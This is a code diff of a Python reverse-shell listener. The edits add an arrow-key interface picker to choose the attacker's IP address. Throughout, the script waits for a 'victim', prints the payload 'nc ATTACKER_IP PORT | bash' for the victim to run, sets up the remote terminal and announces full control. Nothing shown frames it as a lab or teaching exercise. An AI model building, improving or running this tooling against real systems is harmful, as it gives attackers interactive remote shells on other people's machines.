@@ -10,14 +10,84 @@ import threading
 import time
 import shutil
 import signal
+import subprocess
 
-def get_local_ip():
-    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+def get_interfaces():
+    interfaces = []
     try:
-        s.connect(("8.8.8.8", 80))
-        return s.getsockname()[0]
+        result = subprocess.run(['ip', '-o', '-4', 'addr', 'show'],
+                                capture_output=True, text=True)
+        for line in result.stdout.splitlines():
+            parts = line.split()
+            if len(parts) >= 4:
+                iface = parts[1]
+                ip = parts[3].split('/')[0]
+                interfaces.append((iface, ip))
+    except:
+        pass
+    return interfaces
+
+def read_key(fd):
+    ch = os.read(fd, 1)
+    if ch == b'\x1b':
+        try:
+            ch += os.read(fd, 2)
+        except:
+            pass
+    return ch
+
+def pick_interface():
+    interfaces = get_interfaces()
+    if not interfaces:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        try:
+            s.connect(("8.8.8.8", 80))
+            return s.getsockname()[0]
+        finally:
+            s.close()
+
+    selected = 0
+    fd = sys.stdin.fileno()
+    old = termios.tcgetattr(fd)
+
+    def draw(first=False):
+        if first:
+            sys.stdout.write("\033[s")  # save cursor position
+        else:
+            sys.stdout.write("\033[u")  # restore cursor position
+            sys.stdout.write("\033[0J") # clear everything below
+        for i, (iface, ip) in enumerate(interfaces):
+            if i == selected:
+                sys.stdout.write(f"  \033[1;36m▶  {iface:<12} {ip}\033[0m\n")
+            else:
+                sys.stdout.write(f"     \033[2m{iface:<12} {ip}\033[0m\n")
+        sys.stdout.flush()
+
+    print(f"  \033[1;36m[?]\033[0m Select interface \033[2m(↑↓ arrow + Enter)\033[0m\n")
+    draw(first=True)
+
+    try:
+        tty.setraw(fd)
+        while True:
+            ch = read_key(fd)
+
+            if ch == b'\x1b[A':
+                selected = (selected - 1) % len(interfaces)
+                draw()
+            elif ch == b'\x1b[B':
+                selected = (selected + 1) % len(interfaces)
+                draw()
+            elif ch[0:1] in (b'\r', b'\n'):
+                break
+            elif ch[0:1] == b'\x03':
+                termios.tcsetattr(fd, termios.TCSADRAIN, old)
+                print()
+                sys.exit(0)
     finally:
-        s.close()
+        termios.tcsetattr(fd, termios.TCSADRAIN, old)
+
+    print()
+    return interfaces[selected][1]
 
 def get_terminal_size():
     size = shutil.get_terminal_size(fallback=(80, 24))
@@ -46,8 +116,8 @@ def banner():
 
 banner()
 
-ATTACKER_IP = get_local_ip()
-print(f"  \033[1;36m[*]\033[0m Detected IP : \033[1;33m{ATTACKER_IP}\033[0m")
+ATTACKER_IP = pick_interface()
+print(f"  \033[1;36m[*]\033[0m Using IP    : \033[1;33m{ATTACKER_IP}\033[0m")
 
 try:
     PORT = int(input("  \033[1;36m[?]\033[0m Listen port : ").strip())
@@ -92,8 +162,7 @@ time.sleep(0.3)
 print(f"  \033[1;36m[*]\033[0m Waiting for victim on port {PORT}...")
 print(f"  \033[1;36m[*]\033[0m Run this on victim:")
 print()
-# ← highlighted in red, bold
-print(f"      \033[1;31m  nc {ATTACKER_IP} {PORT} | bash  \033[0m")
+print(f"      \033[1;31mnc {ATTACKER_IP} {PORT} | bash\033[0m")
 print()
 
 cmd_srv = make_server(PORT)
@@ -138,13 +207,8 @@ if not shell_sock:
 #  SYNC TERMINAL SIZE
 # ─────────────────────────────────────────
 
-# ─────────────────────────────────────────
-#  SYNC TERMINAL SIZE
-# ─────────────────────────────────────────
-
 time.sleep(1.0)
 
-# drain motd/banner junk
 shell_sock.setblocking(False)
 deadline = time.time() + 0.5
 while time.time() < deadline:
@@ -161,9 +225,6 @@ shell_sock.sendall(f"export TERM=xterm-256color\n".encode())
 time.sleep(0.3)
 shell_sock.sendall(b"clear\n")
 time.sleep(0.5)
-
-# ← REMOVE the second drain block that was here
-# it was eating the shell prompt and waiting for input
 
 print(f"  \033[1;32m[+]\033[0m Shell ready! Rows={rows} Cols={cols}")
 print(f"  \033[1;36m[*]\033[0m You have full control.")
